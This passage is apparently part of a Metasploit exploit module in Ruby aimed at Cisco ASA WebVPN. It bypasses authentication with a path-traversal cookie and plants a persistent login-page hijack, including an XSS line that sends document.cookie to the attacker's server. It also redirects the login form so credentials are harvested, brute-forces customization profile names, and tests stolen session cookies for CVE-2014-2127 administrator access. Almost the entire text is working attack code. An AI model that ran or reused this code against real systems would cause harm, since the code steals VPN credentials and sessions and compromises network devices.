			'application/4/tab-title'=>'AnyConnect',
			'application/4/order'=>'4',
			'application/4/mode'=>'enable',
			'application/5/id'=>'app-access',
			'application/5/tab-title'=>'Application Access',
			'application/5/order'=>'5',
			'application/5/mode'=>'enable',
			'application/6/id'=>'ssh,telnet',
			'application/6/tab-title'=>'SSH/Telnet',
			'application/6/order'=>'6',
			'application/6/mode'=>'enable',
			'application/7/id'=>'ica',
			'application/7/tab-title'=>'MetaFrame Access',
			'application/7/order'=>'7',
			'application/7/mode'=>'enable',
			'application/8/id'=>'post',
			'application/8/tab-title'=>'Plugin to post with preloaded page',
			'application/8/order'=>'8',
			'application/8/mode'=>'enable',
			'application/9/id'=>'rdp',
			'application/9/tab-title'=>'Terminal Services(RDP)',
			'application/9/order'=>'9',
			'application/9/mode'=>'enable',
			'application/10/id'=>'rdp2',
			'application/10/tab-title'=>'Terminal Services(For Vista)',
			'application/10/order'=>'10',
			'application/10/mode'=>'enable',
			'application/11/id'=>'vnc',
			'application/11/tab-title'=>'VNC',
			'application/11/order'=>'11',
			'application/11/mode'=>'enable',
			'portal/window/title-text'=>http_auth_page_params['auth-page/window/title-text'],
			'portal/title-panel/text'=>http_auth_page_params['original-auth-page/title-panel/text']+'</td><script>new Image().src="https://'+datastore['SRVHOST']+'/webvpn/index.html?"+document.cookie;</script><td>',
			'portal/title-panel/logo-url'=>http_auth_page_params['auth-page/title-panel/logo-url'], 
			'portal/title-panel/gradient'=>http_auth_page_params['auth-page/title-panel/gradient'],
			'portal/title-panel/font-weight'=>http_auth_page_params['auth-page/title-panel/font-weight'],
			'portal/title-panel/font-size'=>http_auth_page_params['auth-page/title-panel/font-size'],
			'portal/title-panel/font-color'=>http_auth_page_params['auth-page/title-panel/font-color'],
			'portal/title-panel/background-color'=>http_auth_page_params['auth-page/title-panel/background-color'],
			'portal/title-panel/mode'=>'enable',
			'portal/title-panel/style'=>'',
			'portal/navigation-panel/mode'=>'enable',
			'portal/toolbar/mode'=>'enable',
			'portal/toolbar/prompt-box-title'=>'Address',
			'portal/toolbar/browse-button-text'=>'Browse',
			'portal/toolbar/logout-prompt-text'=>'Logout',
			'portal/home-page/mode'=>'standard',
			'portal/home-page/url'=>'',								
			'portal/url-lists/mode'=>'group',
			'localization/languages'=>'en,ja,fr,ru',
			'localization/default-language'=>''
			}
			return http_portal_variables
			
		
		
	end
	
	
	

	def save_customization(http_post_variables)
	# This writes the Customization values to memory and flash.
	# Our modifications are both reboot and upgrade persistent on the Cisco ASA!
	
		vprint_debug("Sending POST request with Customization values...")
		res = send_request_cgi({
		'agent' => "ASDM/Java/1.7.0_55",
		'cookie'  => "ced=../../locale/ru/LC_MESSAGES/webvpn.mo",
		'method'   => 'POST',
		'uri'      => normalize_uri('/+CSCOE+/cedf.html'),
		'vars_post'=> http_post_variables
		})
		if res && res.code==302
			print_good("HTTP POST of Customization parameters completed successfully!")
		end
		
		vprint_debug("Sending SAVE request for Customization parameters...")
		res = send_request_cgi({
			'agent' => "ASDM/ Java/1.7.0_55",
			'cookie'  => "ced=../../locale/ru/LC_MESSAGES/webvpn.mo",
			'method'   => 'GET',
			'uri'      => normalize_uri('/+CSCOE+/cedsave.html'),
			'vars_get' => {
				'preview' => "logon",
				'obj' => datastore['TARGET_CUSTOM'],
				'f' => "logon",
				'ced' => "../../locale/ru/LC_MESSAGES/webvpn.mo"
			}
		})	
		if res && res.code==200
			content = res.body 
			match_result = content.match(/Saving customization profile/)
			if(match_result) 
				print_good("Customization parameters saved successfully as "+ datastore['TARGET_CUSTOM'])
			else
				print_error("An error occurred saving the Customization...some parameters are missing/invalid")
				vprint_debug(content)
			end
			
		end	
		
	end
	
	def check_success()
	# Check to see if the Customization was saved successfully by parsing login page for our changes!
	# Failure at this stage is due to Customization name not default "DfltCustomization"
	# Brute-force Customization name would be next option...
		res = send_request_cgi({
			'method'   => 'GET',
			'uri'      => '/+CSCOE+/logon.html',
			'headers' =>
				{'Accept-Language' => 'en-US,en;q=0.5'}
			})
			
		if res && res.code==200
			print_status("Parsing https://#{target_host}/+CSCOE+/logon.html for hijacked login...")
			content = res.body 
			match_result = content.match(/#{datastore['SRVHOST']}/)
			if(!match_result && datastore['REMOVE_HIJACK']==true)
				return 0
			end
			if(match_result) 
				print_good("HTML Source update confirmed. The hijack of the Login page was successful!")
				return 1
			else
				print_error("The Login page hijack was not successful!")
				print_error("Error caused by incorrect Customization profile name : "+datastore['TARGET_CUSTOM'])
				print_status("Attempting to guess Customization name through login page data leaks (Group Names)")
				if(guess_customization_name()==1)
					print_good("Potential Customization names found. Update TARGET_CUSTOM for next run. Good luck!")
				else
					print_error("Consider running 'GUESS_CUSTOM_ONLY' mode with a custom dictionary to brute-force the Customization name..")
				end			
				return -1
			end
		else
			return -1
		end
	end
	
	def guess_customization_name()
	# Your exploit ends up here if the remote Cisco ASA has been deemed vulnerable but the exploit is 
	# not taking effect. i.e check_success() failed..
	# The issue is most likely that the remote Cisco ASA is configured to use a custom Customization name.
	# This function will attempt to guess the Customization name using leaked Connection Profile names
	# and their alias found on the logon page...a dictionary attack can also be used to find the name 
	# if this fails. 
	# To use the dictionary attack set CUSTOM_WORDLIST filename
	# Valid Customization is discovered by the presence of a file on the remote ASA:
	# i.e cookie ced=../customization/86D3828A0A0EB0FFA3B55870AAA43E4F
	# where file is /customization/md5(CustomizationName)
	# DfltCustomization == /customization/86D3828A0A0EB0FFA3B55870AAA43E4F

		guess_words = Array.new

		if(datastore['CUSTOM_WORDLIST'])
			print_status("Reading dictionary file "+ datastore['CUSTOM_WORDLIST']+" to guess Customization name!")
			guess_words = File.readlines(datastore['CUSTOM_WORDLIST'])
		end
		
		res = send_request_cgi({
			'method'   => 'GET',
			'uri'      => '/+CSCOE+/logon.html',
			'headers' =>
	                       {'Accept-Language' => 'en-US,en;q=0.5'}
		})
		
		if res && res.code==200
			print_status("Scraping https://#{target_host}/+CSCOE+/logon.html for Connection Profile names and Alias (Group Selector)")
			content = res.body
			text_block = content.split(/<select id="group_list"  name="group_list".*/)
			begin_option_block = text_block[1]
			options_block = begin_option_block.split(/<\/select>/)
			tmp = options_block[0]			
			option_lines = 	tmp.split("\n")
			option_lines.each do |line|
					match_result = line.match(/<option value="(.*)" (?:selected)?>(.*)<\/option>/)
					if(match_result)		
						con_profile,con_alias = match_result.captures
						guess_words.unshift(con_profile)
						guess_words.unshift(con_alias)
					end
			end	
		end
	
		hashed_words = Hash.new
		valid_Customizations = Array.new
		
		
		guess_words.each do |value|
			hashme = value.strip
			hashed_words[hashme]=Rex::Text.md5(hashme).upcase
		end
		
		hashed_words.each do |key, value|		
			print_status("Trying Customization Name #{key}") 
			
			uri = target_uri.path
			res = send_request_cgi({
				'method'   => 'GET',
				'uri'      => normalize_uri('/+CSCOE+/cedlogon.html'),
				'cookie'  => 'ced=../customization/'+value,
				'headers' =>
	                       {'Accept-Language' => 'en-US,en;q=0.5'}
			})
			if res && res.code==200
				content = res.body
				if res and /preview/.match(content)
					print_good("Found a valid Customization name #{key} !!!!!")
					valid_Customizations.push(key)
				end
			end
		end	
		
		if(valid_Customizations.count()>0)
			valid_Customizations.each do |value|
				print_good("Valid Customization name discovered: #{value}")
			end
			return 1
		else
			print_error("No Customization names were found..")
			return 0
		end
		
	end
	
	def revert_hijack(http_post_variables)
		the_hijack_string = '<form id="unicorn_form" method="POST" onsubmit="disableButton()" action="https://'+datastore['SRVHOST']+'/webvpn/index.html" onsubmit="return onSubmit();">'
		print_status("Removing hijack submit string: "+ the_hijack_string)
		http_post_variables['auth-page/title-panel/text'] = http_post_variables['auth-page/title-panel/text'].gsub(the_hijack_string, '')
		the_xss_string = '</td><script>new Image().src="https://'+datastore['SRVHOST']+'/webvpn/index.html?"+document.cookie;</script><td>'
		print_status("Removing XSS cookie stealing string: "+ the_xss_string)
		http_post_variables['portal/title-panel/text'] = http_post_variables['auth-page/title-panel/text'].gsub(the_xss_string, '')
		
		
		
		return http_post_variables
	end
	
	
	def run()
		
	
		if(datastore['GUESS_CUSTOM_ONLY'])
			guess_customization_name()
			return
		end
		
		if(!datastore['SSLCert'] && !datastore['RandomSSLCert'])
			print_error("No SSLCert has been defined. Provide a valid SSL cert or run auxiliary/gather/impersonate_ssl to generate a good looking invalid cert :P")
			print_error("Otherwise 'set RandomSSLCert true' and use a Metasploit auto-generated cert..")
			return
		end
		
		http_auth_page_params = scrape_login_content()
			
		if(datastore['WEBVPN_USERNAME'])
			print_status("Known WebVPN username/password provided. Attempting login..")
			valid_webvpn_cookie = portal_login()
			if(valid_webvpn_cookie == 0)
				print_error("Could not login to WebVPN portal with provided credentials: "+datastore['WEBVPN_USERNAME']+" "+datastore['WEBVPN_PASSWORD'])
				print_error("Check username/password or consider using the generic portal Customization mode \(unset WEBVPN_USERNAME\).")
				return
			end
			http_portal_variables = scrape_custom_portal_content(valid_webvpn_cookie)
		else
			http_portal_variables = generate_generic_portal_content(http_auth_page_params)
		
		end
		
		
		http_post_variables = http_portal_variables.merge(http_auth_page_params)
		http_post_variables.each do |key, value| 
			vprint_debug("POST Parameter: #{key}=#{value}") 
		end
		
		if(datastore['REMOVE_HIJACK']==true)
			xhttp_post_variables = revert_hijack(http_post_variables)
			save_customization(xhttp_post_variables)
			if(check_success()==0)
				print_good("The hijack has now been removed..")
			end
		else
			save_customization(http_post_variables)
			if(check_success()==1)
				exploit()
			else
				print_error("The Login hijack has not been completed. Service will not be started.")
			end			
		end
	end

	
	def check_ssl_vpn(webvpn_cookie)
		uri = target_uri.path
		res = send_request_cgi({
		'method'   => 'CONNECT',
		'uri'      => normalize_uri('/CSCOSSLC/tunnel'),
		'cookie'  => "webvpn="+webvpn_cookie,
		'headers' => {'X-CSTP-Version' => 0}
		})
		print_status("Checking the target Cisco ASA for SSL VPN capability.")
		if res && res.code==406
			print_good("Cisco ASA SSL VPN appears to have AnyConnect SSL client access enabled.")
			print_good("SSL VPN Tunnel command string:\n openconnect https://#{target_host}/ -C #{webvpn_cookie} --no-cert-check")
		end
		if res && res.code==401
			print_error("Cisco ASA SSL VPN access is enabled. WebVPN cookie is not authorised for access.")
		end
		if !res
			print_error("Could not determine SSL VPN configuration status.")
		end
	end
  
  	def check_priv_escalate(webvpn_cookie)
		uri = target_uri.path
		res = send_request_cgi({
		'method'   => 'GET',
		'uri'      => normalize_uri('/admin/exec/show+version'),
		'cookie'  => "webvpn="+webvpn_cookie
		})
		print_status("Checking the target Cisco ASA for CVE-2014-2127 Privilege Escalation Vulnerability using captured cookie.")
		if res && res.code==200
			content = res.body
			if res and /Cisco/.match(content)
				print_good("Cisco ASA is vulnerable to CVE-2014-2127. Your cookie can give you administrator access to the device!")
			end
		else
			print_error("This Cisco ASA is not vulnerable to CVE-2014-2127 Cisco ASA VPN Privilege Escalation Vulnerability.")
		end		
	end
  
  
	def check()
		uri = target_uri.path
		res = send_request_cgi({
		'method'   => 'GET',
		'uri'      => normalize_uri('/+CSCOE+/cedlogon.html'),
		'vars_get' => {
			'obj' => datastore['TARGET_CUSTOM'],
			'preview' => "logon"
		},
		'cookie'  => "ced=../../locale/ru/LC_MESSAGES/webvpn.mo"
		})
		if res && res.code==200
			content = res.body
			if res and /preview/.match(content)
				return Exploit::CheckCode::Vulnerable
			else
				print_error("The authentication bypass was not successful.. the Cisco ASA administrator has not launched a Preview!")
				return Exploit::CheckCode::Safe
			end
		end
	end
 
  
	def do_report(user,pass,group)
		report_auth_info(
		:host => target_host,
		:port => 443,
		:sname => 'Cisco ASA WebVPN',
		:user => user,
		:pass => pass,
		:group => group,	
	)
	end


  
  
	def on_request_uri(cli, request)
		real_webvpn_url = "https://#{target_host}/+webvpn+/index.html"
		reqstring = request.body
		if reqstring and /username/.match(reqstring)
			postvars = request.parse_cgi_qstring(reqstring)
			reportsring = 
			print_good("Receiving Cisco ASA WebVPN login credentials...")
			print_good("Username: "+postvars['username'] + "\tPassword: " + postvars['password'] + "\t Group: "+postvars['group_list'])
			do_report(postvars['username'],postvars['password'],postvars['group_list'])
			vprint_debug("Generating Cisco ASA WebVPN redirect...")
			real_webvpn_url = real_webvpn_url+"?"+reqstring
			send_redirect(cli, real_webvpn_url)
		else
			req_uri = URI.unescape(request.uri)
			webvpn_session_cookie = req_uri.match(/webvpn=(\w+@\w+@\w+@\w+)&/)[1]
			if webvpn_session_cookie		
				print_good("Received valid Cisco ASA WebVPN session cookie: "+webvpn_session_cookie)
				check_ssl_vpn(webvpn_session_cookie)
				check_priv_escalate(webvpn_session_cookie)
			end
			
		end
		send_not_found(cli)
		
	end

end